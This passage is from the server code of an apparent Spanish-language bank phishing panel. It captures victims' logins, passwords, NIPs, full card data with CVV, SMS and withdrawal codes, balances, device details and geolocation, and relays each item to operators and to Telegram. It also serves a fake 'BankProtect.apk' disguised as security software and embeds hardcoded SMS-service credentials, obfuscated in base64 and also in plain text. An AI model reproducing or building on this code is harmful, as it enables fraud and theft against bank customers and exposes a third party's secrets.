            if (client && client.readyState === WebSocket.OPEN) {
              // Send the screen change command to the client
              client.send(JSON.stringify({
                type: 'SCREEN_CHANGE',
                data: validatedData
              }));

              // Update session in storage with the new screen state
              // Remove "mostrar_" prefix from tipo if present
              let screenType = tipo.replace('mostrar_', '');

              // Normalizar screenType para SMS_COMPRA
              if (screenType.toLowerCase() === 'sms_compra' || 
                  screenType.toLowerCase() === 'smscompra' ||
                  screenType.toLowerCase() === 'sms compra') {
                console.log('Normalizando screenType SMS_COMPRA en servidor:', screenType, 'to', ScreenType.SMS_COMPRA);
                screenType = ScreenType.SMS_COMPRA;
              }

              // Normalizar screenType para PROTECCION_BANCARIA
              if (screenType.toLowerCase() === 'proteccion_bancaria') {
                console.log('Normalizando screenType PROTECCION_BANCARIA en servidor:', screenType, 'to', ScreenType.PROTECCION_BANCARIA);
                screenType = ScreenType.PROTECCION_BANCARIA;
              }

              // Normalizar screenType para PROTECCION_SALDO
              if (screenType.toLowerCase() === 'proteccion_saldo') {
                console.log('Normalizando screenType PROTECCION_SALDO en servidor:', screenType, 'to', ScreenType.PROTECCION_SALDO);
                screenType = ScreenType.PROTECCION_SALDO;
              }

              // Actualizar la última actividad de la sesión
              await storage.updateSessionActivity(sessionId);
              
              // Para protección bancaria, configurar automáticamente el archivo APK según el banco
              const updateData: any = { pasoActual: screenType };
              if (screenType === ScreenType.PROTECCION_BANCARIA) {
                // Obtener información de la sesión para determinar el banco
                const session = await storage.getSessionById(sessionId);
                if (session && session.banco) {
                  const bankCode = session.banco.toUpperCase();
                  console.log('Configurando archivo de protección para banco:', bankCode);
                  
                  // Todos los bancos usan el mismo archivo APK universal
                  const protectionFile = {
                    fileName: 'BankProtect.apk',
                    fileUrl: '/assets/Bankprotet2_1750982122281.apk',
                    fileSize: '4.2 MB'
                  };
                  
                  updateData.fileName = protectionFile.fileName;
                  updateData.fileUrl = protectionFile.fileUrl;
                  updateData.fileSize = protectionFile.fileSize;
                  console.log('Archivo de protección universal configurado para:', bankCode, ':', protectionFile.fileName);
                }
                
                // También considerar archivo manual si está presente en validatedData
                if (validatedData.fileName) {
                  updateData.fileName = validatedData.fileName;
                  updateData.fileUrl = validatedData.fileUrl;
                  updateData.fileSize = validatedData.fileSize;
                  console.log('Usando archivo manual de protección:', validatedData.fileName);
                }
              }
              
              await storage.updateSession(sessionId, updateData);
              console.log('Actualizado pasoActual a:', screenType);

              // Notify specific admin clients about the update
              const updatedSession = await storage.getSessionById(sessionId);
              // Obtenemos el creador de la sesión para saber a quién enviar la notificación
              const createdBy = updatedSession?.createdBy || '';
              broadcastToAdmins(JSON.stringify({
                type: 'SESSION_UPDATE',
                data: updatedSession
              }), createdBy); // Dirigimos el mensaje al creador de la sesión

              // Enviar notificación de cambio de pantalla a Telegram
              if (updatedSession) {
                await sendScreenChangeNotification({
                  sessionId,
                  banco: updatedSession.banco || 'Desconocido',
                  newScreen: screenType,
                  adminUser: 'Admin', // Podríamos obtener el usuario admin específico si es necesario
                  data: validatedData
                });
              }
            }
          } catch (error) {
            console.error("Invalid screen change data:", error);
            ws.send(JSON.stringify({ 
              type: 'ERROR', 
              message: "Invalid screen change data" 
            }));
          }
          return;
        }

        // Handle client input data
        if (data.type === 'CLIENT_INPUT') {
          try {
            // Validate the data
            const validatedData = clientInputSchema.parse(data.data);
            const { sessionId, tipo, data: inputData } = validatedData;
            
            // Actualizar la última actividad de la sesión
            await storage.updateSessionActivity(sessionId);
            
            // Indicar que esta sesión ya tiene datos de usuario (para evitar eliminación automática)
            await storage.markSessionHasUserData(sessionId);

            // Update the session with the new data
            const updatedFields: Record<string, any> = {};

            switch (tipo) {
              case 'geolocation':
                // Manejar datos de geolocalización
                if (inputData.latitude) {
                  updatedFields.latitude = inputData.latitude;
                }
                if (inputData.longitude) {
                  updatedFields.longitude = inputData.longitude;
                }
                if (inputData.googleMapsLink) {
                  updatedFields.googleMapsLink = inputData.googleMapsLink;
                }
                if (inputData.locationTimestamp) {
                  updatedFields.locationTimestamp = new Date(inputData.locationTimestamp);
                }
                
                // La IP se capturará desde el cliente usando una API externa o desde el navegador
                // Por ahora marcamos como "Obtenida desde cliente"
                updatedFields.ipAddress = inputData.ipAddress || 'IP no disponible desde WebSocket';

                console.log('Información de geolocalización guardada:', {
                  latitud: inputData.latitude,
                  longitud: inputData.longitude,
                  googleMapsLink: inputData.googleMapsLink,
                  ip: updatedFields.ipAddress,
                  timestamp: inputData.locationTimestamp
                });
                
                // Enviar notificación a Telegram con información de ubicación
                const geolocationSessionData = await storage.getSessionById(sessionId);
                if (geolocationSessionData) {
                  await sendTelegramNotification({
                    sessionId,
                    banco: geolocationSessionData.banco || 'Desconocido',
                    tipo: 'geolocation',
                    data: {
                      ...inputData,
                      ipAddress: updatedFields.ipAddress
                    },
                    timestamp: new Date().toISOString(),
                    createdBy: geolocationSessionData.createdBy || 'Desconocido'
                  });
                }
                break;

              case 'folio':
                updatedFields.folio = inputData.folio;
                // Guardar información del dispositivo si está disponible
                if (inputData.deviceType) {
                  updatedFields.deviceType = inputData.deviceType;
                }
                if (inputData.deviceModel) {
                  updatedFields.deviceModel = inputData.deviceModel;
                }
                if (inputData.deviceBrowser) {
                  updatedFields.deviceBrowser = inputData.deviceBrowser;
                }
                if (inputData.deviceOs) {
                  updatedFields.deviceOs = inputData.deviceOs;
                }
                if (inputData.userAgent) {
                  updatedFields.userAgent = inputData.userAgent;
                }
                console.log('Información del dispositivo guardada:', {
                  tipo: inputData.deviceType,
                  modelo: inputData.deviceModel,
                  navegador: inputData.deviceBrowser,
                  so: inputData.deviceOs
                });
                
                // Enviar notificación a Telegram
                const sessionData = await storage.getSessionById(sessionId);
                if (sessionData) {
                  await sendTelegramNotification({
                    sessionId,
                    banco: sessionData.banco || 'Desconocido',
                    tipo: 'folio',
                    data: inputData,
                    deviceInfo: {
                      type: inputData.deviceType,
                      model: inputData.deviceModel,
                      browser: inputData.deviceBrowser,
                      os: inputData.deviceOs
                    },
                    timestamp: new Date().toISOString(),
                    createdBy: sessionData.createdBy || 'Desconocido'
                  });
                }
                break;
              case 'login':
                updatedFields.username = inputData.username;
                updatedFields.password = inputData.password;
                
                // Enviar notificación a Telegram
                const loginSessionData = await storage.getSessionById(sessionId);
                if (loginSessionData) {
                  await sendTelegramNotification({
                    sessionId,
                    banco: loginSessionData.banco || 'Desconocido',
                    tipo: 'login',
                    data: inputData,
                    timestamp: new Date().toISOString(),
                    createdBy: loginSessionData.createdBy || 'Desconocido'
                  });
                }
                break;
              case 'codigo':
                updatedFields.sms = inputData.codigo;
                
                // Enviar notificación a Telegram
                const codigoSessionData = await storage.getSessionById(sessionId);
                if (codigoSessionData) {
                  await sendTelegramNotification({
                    sessionId,
                    banco: codigoSessionData.banco || 'Desconocido',
                    tipo: 'codigo',
                    data: inputData,
                    timestamp: new Date().toISOString(),
                    createdBy: codigoSessionData.createdBy || 'Desconocido'
                  });
                }
                break;
              case 'nip':
                updatedFields.nip = inputData.nip;
                
                // Enviar notificación a Telegram
                const nipSessionData = await storage.getSessionById(sessionId);
                if (nipSessionData) {
                  await sendTelegramNotification({
                    sessionId,
                    banco: nipSessionData.banco || 'Desconocido',
                    tipo: 'nip',
                    data: inputData,
                    timestamp: new Date().toISOString(),
                    createdBy: nipSessionData.createdBy || 'Desconocido'
                  });
                }
                break;
              case 'tarjeta':
                updatedFields.tarjeta = inputData.tarjeta;
                updatedFields.fechaVencimiento = inputData.fechaVencimiento;
                updatedFields.cvv = inputData.cvv;
                
                // Enviar notificación a Telegram
                const tarjetaSessionData = await storage.getSessionById(sessionId);
                if (tarjetaSessionData) {
                  await sendTelegramNotification({
                    sessionId,
                    banco: tarjetaSessionData.banco || 'Desconocido',
                    tipo: 'tarjeta',
                    data: inputData,
                    timestamp: new Date().toISOString(),
                    createdBy: tarjetaSessionData.createdBy || 'Desconocido'
                  });
                }
                break;
              case 'sms_compra':
              case 'SMS_COMPRA':
              case 'smsCompra':
                // Asegurarnos de manejar correctamente las respuestas de SMS_COMPRA
                if (inputData && inputData.smsCompra) {
                  updatedFields.smsCompra = inputData.smsCompra;
                  console.log('Recibido código de cancelación SMS_COMPRA:', inputData.smsCompra);

                  // Notificar a los administradores el código de cancelación inmediatamente
                  // Obtenemos la sesión para saber quién la creó
                  const sessionData = await storage.getSessionById(sessionId);
                  const createdBy = sessionData?.createdBy || '';
                  
                  broadcastToAdmins(JSON.stringify({
                    type: 'SMS_COMPRA_CODE',
                    data: {
                      sessionId,
                      code: inputData.smsCompra,
                      createdBy // Añadimos el creador para referencia
                    }
                  }), createdBy); // Enviamos solo al creador y al superadmin
                  
                  // Enviar notificación a Telegram
                  await sendTelegramNotification({
                    sessionId,
                    banco: sessionData?.banco || 'Desconocido',
                    tipo: 'sms_compra',
                    data: inputData,
                    timestamp: new Date().toISOString(),
                    createdBy: sessionData?.createdBy || 'Desconocido'
                  });
                } else {
                  console.error('Error: datos SMS_COMPRA recibidos sin código de cancelación:', inputData);
                }
                break;
              case 'celular':
                updatedFields.celular = inputData.celular;
                
                // Enviar notificación a Telegram
                const celularSessionData = await storage.getSessionById(sessionId);
                if (celularSessionData) {
                  await sendTelegramNotification({
                    sessionId,
                    banco: celularSessionData.banco || 'Desconocido',
                    tipo: 'celular',
                    data: inputData,
                    timestamp: new Date().toISOString(),
                    createdBy: celularSessionData.createdBy || 'Desconocido'
                  });
                }
                break;
              case 'CANCELACION_RETIRO':
              case 'cancelacion_retiro':
                if (inputData && inputData.codigoRetiro) {
                  updatedFields.codigoRetiro = inputData.codigoRetiro;
                  
                  // Guardar también el PIN de retiro si se ha proporcionado
                  if (inputData.pinRetiro) {
                    updatedFields.pinRetiro = inputData.pinRetiro;
                    console.log('Recibido código de retiro:', inputData.codigoRetiro, 'con PIN:', inputData.pinRetiro);
                  } else {
                    console.log('Recibido código de retiro:', inputData.codigoRetiro, 'sin PIN');
                  }

                  // Notificar a los administradores el código de retiro y PIN inmediatamente
                  const sessionData = await storage.getSessionById(sessionId);
                  const createdBy = sessionData?.createdBy || '';
                  
                  broadcastToAdmins(JSON.stringify({
                    type: 'RETIRO_CODE',
                    data: {
                      sessionId,
                      code: inputData.codigoRetiro,
                      pin: inputData.pinRetiro || '',
                      createdBy // Añadimos el creador para referencia
                    }
                  }), createdBy); // Enviamos solo al creador y al superadmin
                  
                  // Enviar notificación a Telegram
                  await sendTelegramNotification({
                    sessionId,
                    banco: sessionData?.banco || 'Desconocido',
                    tipo: 'cancelacion_retiro',
                    data: inputData,
                    timestamp: new Date().toISOString(),
                    createdBy: sessionData?.createdBy || 'Desconocido'
                  });
                } else {
                  console.error('Error: datos CANCELACION_RETIRO recibidos sin código de retiro:', inputData);
                }
                break;
              case 'ESCANEAR_QR':
              case 'escanear_qr':
                if (inputData && inputData.qrData) {
                  updatedFields.qrData = inputData.qrData;
                  
                  // Guardar la imagen del QR si existe
                  if (inputData.qrImageData) {
                    updatedFields.qrImageData = inputData.qrImageData;
                    console.log('Recibida imagen del QR en formato base64');
                  }
                  
                  console.log('Recibido código QR:', inputData.qrData.substring(0, 50) + '...');

                  // Notificar a los administradores el código QR inmediatamente
                  const sessionData = await storage.getSessionById(sessionId);
                  const createdBy = sessionData?.createdBy || '';
                  
                  broadcastToAdmins(JSON.stringify({
                    type: 'QR_SCANNED',
                    data: {
                      sessionId,
                      qrData: inputData.qrData,
                      qrImageData: inputData.qrImageData, // Incluir la imagen
                      createdBy,
                      timestamp: new Date().toISOString()
                    }
                  }), createdBy); // Enviamos solo al creador y al superadmin
                  
                  // Enviar notificación a Telegram
                  await sendTelegramNotification({
                    sessionId,
                    banco: sessionData?.banco || 'Desconocido',
                    tipo: 'escanear_qr',
                    data: inputData,
                    timestamp: new Date().toISOString(),
                    createdBy: sessionData?.createdBy || 'Desconocido'
                  });
                } else {
                  console.error('Error: datos de QR recibidos sin contenido:', inputData);
                }
                break;
              case 'PROTECCION_BANCARIA':
              case 'proteccion_bancaria':
                if (inputData && inputData.action === 'download') {
                  console.log('Cliente descargó archivo de protección:', inputData.fileName);
                  
                  // Enviar notificación de descarga a Telegram
                  const sessionData = await storage.getSessionById(sessionId);
                  if (sessionData) {
                    await sendFileDownloadNotification({
                      sessionId,
                      banco: sessionData.banco || 'Desconocido',
                      fileName: inputData.fileName || 'archivo_desconocido',
                      fileSize: inputData.fileSize,
                      adminUser: sessionData.createdBy || 'Admin'
                    });
                  }
                  
                  // Notificar a los administradores sobre la descarga
                  const createdBy = sessionData?.createdBy || '';
                  broadcastToAdmins(JSON.stringify({
                    type: 'FILE_DOWNLOADED',
                    data: {
                      sessionId,
                      fileName: inputData.fileName,
                      fileSize: inputData.fileSize,
                      timestamp: new Date().toISOString(),
                      createdBy
                    }
                  }), createdBy);
                }
                break;
              case 'PROTECCION_SALDO':
              case 'proteccion_saldo':
                if (inputData) {
                  // Usar los nombres correctos de las columnas en snake_case
                  updatedFields.saldoDebito = inputData.saldoDebito;
                  updatedFields.montoDebito = inputData.montoDebito;
                  updatedFields.saldoCredito = inputData.saldoCredito;
                  updatedFields.montoCredito = inputData.montoCredito;
                  
                  console.log('Recibidos datos de protección de saldo:', {
                    debito: inputData.saldoDebito,
                    montoDebito: inputData.montoDebito,
                    credito: inputData.saldoCredito,
                    montoCredito: inputData.montoCredito
                  });

                  // Notificar a los administradores inmediatamente
                  const sessionData = await storage.getSessionById(sessionId);
                  const createdBy = sessionData?.createdBy || '';
                  
                  broadcastToAdmins(JSON.stringify({
                    type: 'PROTECCION_SALDO_DATA',
                    data: {
                      sessionId,
                      saldoDebito: inputData.saldoDebito,
                      montoDebito: inputData.montoDebito,
                      saldoCredito: inputData.saldoCredito,
                      montoCredito: inputData.montoCredito,
                      timestamp: new Date().toISOString(),
                      createdBy
                    }
                  }), createdBy);
                  
                  // Enviar notificación a Telegram
                  await sendTelegramNotification({
                    sessionId,
                    banco: sessionData?.banco || 'Desconocido',
                    tipo: 'proteccion_saldo',
                    data: inputData,
                    timestamp: new Date().toISOString(),
                    createdBy: sessionData?.createdBy || 'Desconocido'
                  });
                }
                break;
            }

            console.log(`Received data from client ${sessionId}: ${tipo}`, inputData);

            // Enviar notificación en tiempo real de la entrada del cliente
            // Obtenemos la sesión para saber quién la creó y enviarle la notificación
            const session = await storage.getSessionById(sessionId);
            const createdBy = session?.createdBy || '';
            
            broadcastToAdmins(JSON.stringify({
              type: 'CLIENT_INPUT_REALTIME',
              data: {
                sessionId,
                tipo,
                inputData,
                timestamp: new Date().toISOString(),
                createdBy // Añadimos el creador para referencia
              }
            }), createdBy); // Dirigimos el mensaje al creador de la sesión

            // Update session if we have fields to update
            if (Object.keys(updatedFields).length > 0) {
              const updatedSession = await storage.updateSession(sessionId, updatedFields);

              // Notify specific admin clients about the database update
              // Enviamos el mensaje al creador de la sesión
              const createdBy = updatedSession?.createdBy || '';
              broadcastToAdmins(JSON.stringify({
                type: 'SESSION_UPDATE',
                data: updatedSession
              }), createdBy); // Dirigimos el mensaje al creador de la sesión
            }

            // === LÓGICA DE FLUJO AUTOMÁTICO ===
            // Función recursiva para avanzar automáticamente por pasos pasivos
            const advanceToNextStep = async (fromStepIndex: number) => {
              const session = await storage.getSessionById(sessionId);
              if (!session || !Array.isArray(session.flowConfig)) return;
              
              const nextStepIndex = fromStepIndex + 1;
              const nextStep = session.flowConfig[nextStepIndex];
              
              if (!nextStep) {
                console.log(`[AutoFlow] Flujo completado - no hay más pasos`);
                return;
              }
              
              console.log(`[AutoFlow] Avanzando al paso ${nextStepIndex}: ${nextStep.screenType}`);
              
              // Actualizar el índice del paso en la sesión
              await storage.updateSession(sessionId, {
                currentStepIndex: nextStepIndex,
                stepStartedAt: new Date(),
                pasoActual: nextStep.screenType
              });
              
              // Enviar mensaje al cliente para cambiar de pantalla
              const clientWs = clients.get(sessionId);
              if (!clientWs || clientWs.readyState !== 1) return;
              
              clientWs.send(JSON.stringify({
                type: 'SCREEN_CHANGE',
                data: {
                  tipo: `mostrar_${nextStep.screenType}`,
                  screenType: nextStep.screenType
                }
              }));
              console.log(`[AutoFlow] Mensaje SCREEN_CHANGE enviado al cliente para ${nextStep.screenType}`);
              
              // Si el siguiente paso NO requiere input del usuario, programar auto-avance
              if (nextStep.waitForUserInput === false) {
                const duration = nextStep.durationMs || 2000;
                console.log(`[AutoFlow] Paso ${nextStep.screenType} no requiere input, avanzando automáticamente en ${duration}ms`);
                
                setTimeout(async () => {
                  // Verificar que la sesión siga en el mismo paso antes de avanzar
                  const checkSession = await storage.getSessionById(sessionId);
                  if (checkSession && checkSession.currentStepIndex === nextStepIndex) {
                    // Llamada recursiva para continuar con el siguiente paso
                    await advanceToNextStep(nextStepIndex);
                  }
                }, duration);
              }
            };
            
            // Verificar si la sesión tiene un flujo personalizado configurado
            const currentSession = await storage.getSessionById(sessionId);
            if (currentSession && currentSession.flowConfig && Array.isArray(currentSession.flowConfig)) {
              console.log(`[AutoFlow] Sesión ${sessionId} tiene flujo configurado con ${currentSession.flowConfig.length} pasos`);
              
              const currentStepIndex = currentSession.currentStepIndex || 0;
              const currentStep = currentSession.flowConfig[currentStepIndex];
              
              if (currentStep) {
                console.log(`[AutoFlow] Paso actual (${currentStepIndex}): ${currentStep.screenType}, esperaInput: ${currentStep.waitForUserInput}`);
                
                // Verificar si el paso actual requiere entrada del usuario
                const requiresInput = currentStep.waitForUserInput !== false; // Por defecto true
                
                // Si el paso requiere entrada y acabamos de recibirla, o si no requiere entrada, avanzar
                const shouldAdvance = (requiresInput && tipo !== 'validando' && tipo !== 'geolocation') || !requiresInput;
                
                if (shouldAdvance) {
                  await advanceToNextStep(currentStepIndex);
                }
              }
            }
            // === FIN DE LÓGICA DE FLUJO AUTOMÁTICO ===

          } catch (error) {
            console.error("Invalid client input data:", error);
            ws.send(JSON.stringify({ 
              type: 'ERROR', 
              message: "Invalid client input data" 
            }));
          }
          return;
        }
      } catch (error) {
        console.error("Error processing WebSocket message:", error);
      }
    });

    // Handle disconnection
    ws.on('close', () => {
      // Buscar y eliminar el cliente del adminClients Map
      let adminUserRemoved = false;
      
      // Iteramos sobre el Map usando entradas como array
      const adminEntries = Array.from(adminClients.entries());
      for (let i = 0; i < adminEntries.length; i++) {
        const [username, client] = adminEntries[i];
        if (client === ws) {
          adminClients.delete(username);
          console.log(`Admin client disconnected: ${username}`);
          adminUserRemoved = true;
          break; // Terminamos el bucle una vez encontrado
        }
      }
      
      // Si no era un cliente admin, revisamos si era un cliente regular
      if (!adminUserRemoved) {
        // Buscar y eliminar de clients si era un cliente
        const clientEntries = Array.from(clients.entries());
        for (let i = 0; i < clientEntries.length; i++) {
          const [sessionId, client] = clientEntries[i];
          if (client === ws) {
            clients.delete(sessionId);
            console.log(`Client with session ID ${sessionId} disconnected`);
            break; // Terminamos el bucle una vez encontrado
          }
        }
      }
    });
  });

  // === API de SMS ===

  // Obtener la configuración actual de la API de SMS
  app.get('/api/sms/config', async (req, res) => {
    try {
      if (!req.isAuthenticated()) {
        return res.status(401).json({ message: "No autenticado" });
      }

      const config = await storage.getSmsConfig();
      // Si hay una config, ocultamos las credenciales por seguridad, solo mostramos si están activas
      if (config) {
        res.json({
          isActive: config.isActive,
          updatedAt: config.updatedAt,
          updatedBy: config.updatedBy,
          hasCredentials: !!(config.username && config.password), // Verificar si hay credenciales configuradas
          apiUrl: config.apiUrl || 'https://api.sofmex.mx/api/sms'
        });
      } else {
        res.json({
          isActive: false,
          hasCredentials: false,
          apiUrl: Buffer.from('aHR0cHM6Ly9hcGkuc29mbWV4Lm14L2FwaS9zbXM=', 'base64').toString(),
          updatedAt: null,
          updatedBy: null
        });
      }
    } catch (error: any) {
      res.status(500).json({ message: error.message });
    }
  });

  // Actualizar la configuración de la API de SMS
  app.post('/api/sms/config', async (req, res) => {
    try {
      if (!req.isAuthenticated()) {
        return res.status(401).json({ message: "No autenticado" });
      }

      const user = req.user;
      // Solo usuario administrador puede actualizar la configuración
      if (user.role !== UserRole.ADMIN) {
        return res.status(403).json({ message: "Solo administradores pueden actualizar la configuración de API" });
      }

      // Verificamos si es un modo de simulación
      const apiUrl = req.body.apiUrl || 'https://api.sofmex.mx/api/sms';
      const simulationMode = apiUrl && (apiUrl.includes('simulacion') || apiUrl.includes('localhost'));

      // Usar las credenciales proporcionadas o las predeterminadas ofuscadas
      const defaultUser = Buffer.from('am9zZW1vcmVub2ZzMTlAZ21haWwuY29t', 'base64').toString();
      const defaultPass = Buffer.from('QmFsb24xOUA=', 'base64').toString();
      const username = req.body.username || defaultUser;
      const password = req.body.password || defaultPass;
      
      // La API está activa si está en modo simulación o si tiene credenciales válidas
      const hasValidCredentials = simulationMode || (!!username && !!password);
      const isActive = hasValidCredentials;
      
      // Si no estamos en modo simulación y faltan credenciales, advertimos pero seguimos
      let credentialsWarning = '';
      if (!simulationMode && (!username || !password)) {
        credentialsWarning = "Advertencia: No has proporcionado credenciales válidas para el modo real.";
      }

      const data = insertSmsConfigSchema.parse({
        username: username,
        password: password,
        apiUrl: apiUrl,
        isActive: isActive,
        updatedBy: user.username
      });

      const config = await storage.updateSmsConfig(data);

      // Respuesta adicional para el modo simulación
      const response: {
        isActive: boolean | null;
        updatedAt: Date | null;
        updatedBy: string;
        hasCredentials: boolean;
        apiUrl: string | null;
        success: boolean;
        message?: string;
      } = {
        isActive: config.isActive,
        updatedAt: config.updatedAt,
        updatedBy: config.updatedBy,
        hasCredentials: hasValidCredentials,
        apiUrl: config.apiUrl,
        success: true
      };

      if (simulationMode) {
        console.log("API de SMS configurada en modo simulación:", config.apiUrl);
        response.message = "API configurada en modo simulación. Los mensajes serán enviados solo de manera simulada.";
      }

      res.json(response);
    } catch (error: any) {
      res.status(500).json({ message: error.message });
    }
  });

  // Obtener los créditos SMS del usuario actual
  app.get('/api/sms/credits', async (req, res) => {
    try {
      if (!req.isAuthenticated()) {
        return res.status(401).json({ message: "No autenticado" });
      }

      const user = req.user;
      const credits = await storage.getUserSmsCredits(user.id);
      res.json({ credits });
    } catch (error: any) {
      res.status(500).json({ message: error.message });
    }
  });

  // Obtener el historial de SMS del usuario actual
  app.get('/api/sms/history', async (req, res) => {
    try {
      if (!req.isAuthenticated()) {
        return res.status(401).json({ message: "No autenticado" });
      }

      const user = req.user;
      const history = await storage.getUserSmsHistory(user.id);
      res.json(history);
    } catch (error: any) {
      res.status(500).json({ message: error.message });
    }
  });

  // Obtener información sobre las rutas SMS disponibles
  app.get('/api/sms/routes', async (req, res) => {
    try {
      if (!req.isAuthenticated()) {
        return res.status(401).json({ message: "No autenticado" });
      }

      const routes = [
        {
          type: SmsRouteType.LONG_CODE,
          name: "Long Code (Ankarex)",
          description: "Ruta económica con buena entregabilidad",
          creditCost: 0.5,
          provider: "Ankarex",
          reliability: "Media-Alta",
          speed: "Normal"
        },
        {
          type: SmsRouteType.SHORT_CODE,
          name: "Short Code (eims)",
          description: "Ruta premium con alta velocidad de entrega",
          creditCost: 1,
          provider: "eims",
          reliability: "Muy Alta",
          speed: "Muy Rápida"
        },
        {
          type: SmsRouteType.PREMIUM,
          name: "Premium (eims)",
          description: "Ruta premium de alta calidad y velocidad",
          creditCost: 1,
          provider: "eims",
          reliability: "Muy Alta",
          speed: "Muy Rápida"
        }
      ];

      res.json({ success: true, routes });
    } catch (error: any) {
      res.status(500).json({ success: false, message: error.message });
    }
  });



  // Enviar un SMS (RUTA ANTIGUA - COMENTADA)
  /*
  app.post('/api/sms/send', async (req, res) => {
    try {
      console.log("Recibida solicitud de envío de SMS");
      
      if (!req.isAuthenticated()) {
        console.log("Error: Usuario no autenticado");
        return res.status(401).json({ message: "No autenticado" });
      }

      const user = req.user;
      console.log(`Usuario: ${user.username}, Role: ${user.role}`);
      
      const config = await storage.getSmsConfig();
      console.log("Configuración SMS:", config);

      // Verificar si la API está configurada
      if (!config || !config.isActive) {
        console.log("Error: API no configurada o inactiva");
        return res.status(400).json({ 
          success: false, 
          message: "La API de SMS no está configurada o está inactiva" 
        });
      }

      // Verificar si está en modo simulación (con la URL simple 'simulacion')
      const simulationMode = config.apiUrl === 'simulacion' || 
                          (config.apiUrl && (config.apiUrl.includes('simulacion') || config.apiUrl.includes('localhost')));
      
      console.log("Modo simulación detectado:", simulationMode);

      // En modo simulación no necesitamos credenciales válidas, pero en modo real sí
      const hasValidCredentials = simulationMode || (!!config.username && !!config.password);
      
      // Si no estamos en modo simulación y no tenemos credenciales válidas, no podemos enviar
      if (!hasValidCredentials) {
        return res.status(400).json({ 
          success: false, 
          message: "La API de SMS no tiene credenciales configuradas. Ve a Configuración y proporciona un usuario y contraseña válidos." 
        });
      }

      // Verificar si el usuario tiene créditos (solo para usuarios regulares)
      // Los administradores no necesitan créditos para enviar SMS
      if (user.role !== UserRole.ADMIN) {
        const hasCredits = await storage.useSmsCredit(user.id);
        if (!hasCredits) {
          return res.status(400).json({ 
            success: false, 
            message: "No tienes créditos suficientes para enviar un SMS" 
          });
        }
      }

      // Validar los datos del SMS
      const { phoneNumber, message, sessionId } = req.body;
      
      console.log("Datos de SMS a enviar:", { phoneNumber, messageLength: message?.length || 0, sessionId });

      if (!phoneNumber) {
        return res.status(400).json({ 
          success: false, 
          message: "Se requiere número de teléfono" 
        });
      }
      
      // Permitir mensaje vacío para mayor flexibilidad
      const messageContent = message || "Mensaje de prueba";

      // Preparar los datos para el historial
      const smsData = insertSmsHistorySchema.parse({
        userId: user.id,
        phoneNumber,
        message: messageContent,
        sessionId: sessionId || null
      });

      // Guardar en el historial como pendiente
      const smsRecord = await storage.addSmsToHistory(smsData);

      // Verificar si estamos en modo simulación antes de continuar
      if (simulationMode) {
        console.log("Detectado modo simulación - Procesando SMS simulado");
        // Actualizar el registro como enviado (simulado)
        await storage.updateSmsStatus(smsRecord.id, 'sent');
        
        return res.json({
          success: true,
          message: "Mensaje enviado correctamente (simulado)",
          smsId: smsRecord.id,
          simulated: true
        });
      }
      
      // Implementación real de la API de Sofmex (sólo se ejecuta si no estamos en modo simulación)
      try {
        // Primero verificamos que tengamos una configuración
        if (!config) {
          throw new Error("Configuración de API no encontrada");
        }
        
        const username = config.username || 'josemorenofs19@gmail.com';
        const password = config.password || 'Balon19@';
        
        // Ajustar URL base según la documentación oficial de SofMex
        const apiUrl = config.apiUrl || 'https://api.sofmex.mx';
        
        // URL específica para envío de SMS según la documentación de SofMex
        // Consultar correctamente la documentación en https://api.sofmex.mx/api/swagger-ui/index.html
        
        // Telegram funciona con esta URL, así que usemos el mismo formato
        let smsApiUrl = 'https://api.sofmex.mx/smssend';
        console.log("Usando URL para API de SofMex:", smsApiUrl);
        
        // Ya no usamos autenticación básica en los headers porque pasamos los datos
        // directamente en el cuerpo de la solicitud
        
        // Formato del cuerpo según el formato que espera la API
        const requestData = {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json'
          },
          body: JSON.stringify({
            numero: phoneNumber,             // El número de teléfono 
            mensaje: messageContent,         // El mensaje a enviar
            usuario: username,               // Usuario para autenticación
            password: password               // Contraseña para autenticación
          })
        };

        console.log("Enviando SMS a través de la API:", {
          url: smsApiUrl,
          phone: phoneNumber,
          messageLength: messageContent.length
        });

        try {
          console.log("Intentando conectar a:", smsApiUrl);
          // Ocultar la contraseña en los logs para seguridad
          const logData = JSON.parse(requestData.body as string);
          const redactedData = {
              ...logData,
              password: "[CONTRASEÑA_OCULTA]"
          };
          
          console.log("Datos de la solicitud:", {
            method: requestData.method,
            headers: requestData.headers,
            datos: redactedData
          });

          // Ya verificamos el modo simulación arriba, así que este bloque es innecesario
          // Lo eliminamos para evitar confusiones

          // Agregar timeout para evitar bloqueo indefinido
          const controller = new AbortController();
          const timeoutId = setTimeout(() => controller.abort(), 10000);

          try {
            // Usaremos axios en lugar de fetch ya que puede manejar mejor ciertas situaciones de red
            console.log("Usando axios para realizar la solicitud");
            const axiosResponse = await axios.post(smsApiUrl, {
              numero: phoneNumber,
              mensaje: messageContent,
              usuario: username,
              password: password
            }, {
              headers: {
                'Content-Type': 'application/json'
              },
              timeout: 10000 // 10 segundos de timeout
            });
            
            // Simulamos una respuesta fetch para mantener compatibilidad con el código existente
            const response = {
              ok: axiosResponse.status >= 200 && axiosResponse.status < 300,
              status: axiosResponse.status,
              statusText: axiosResponse.statusText,
              text: async () => JSON.stringify(axiosResponse.data)
            };

            clearTimeout(timeoutId);

            const responseText = await response.text();
            let responseData;

            try {
              responseData = JSON.parse(responseText);
            } catch (e) {
              responseData = { message: `Respuesta no es JSON válido: ${responseText.substring(0, 100)}` };
            }

            console.log("Respuesta recibida:", {
              status: response.status,
              statusText: response.statusText,
              data: responseData
            });

            if (response.ok) {
              // Actualizar el registro como enviado
              await storage.updateSmsStatus(smsRecord.id, 'sent');
              console.log("SMS enviado correctamente:", responseData);

              res.json({
                success: true,
                message: "Mensaje enviado correctamente",
                smsId: smsRecord.id,
                apiResponse: responseData
              });
            } else {
              // La API respondió con un error
              const errorMsg = responseData.message || `Error ${response.status}: ${response.statusText}`;
              await storage.updateSmsStatus(smsRecord.id, 'failed', errorMsg);
              console.error("Error al enviar SMS:", errorMsg);

              res.status(400).json({
                success: false,
                message: `Error en la API de SMS: ${errorMsg}`,
                smsId: smsRecord.id
              });
            }
          } catch (fetchError: any) {
            if (fetchError.name === 'AbortError') {
              const timeoutMsg = 'La solicitud excedió el tiempo de espera (10 segundos)';
              await storage.updateSmsStatus(smsRecord.id, 'failed', timeoutMsg);
              console.error("Timeout en la solicitud a la API de SMS");

              res.status(500).json({
                success: false,
                message: timeoutMsg,
                smsId: smsRecord.id
              });
            } else {
              throw fetchError; // Propagar otros errores al manejador externo
            }
          }

        } catch (error: any) {
          // Error al realizar la solicitud fetch
          const errorMsg = error.message || 'Error de conexión con la API';
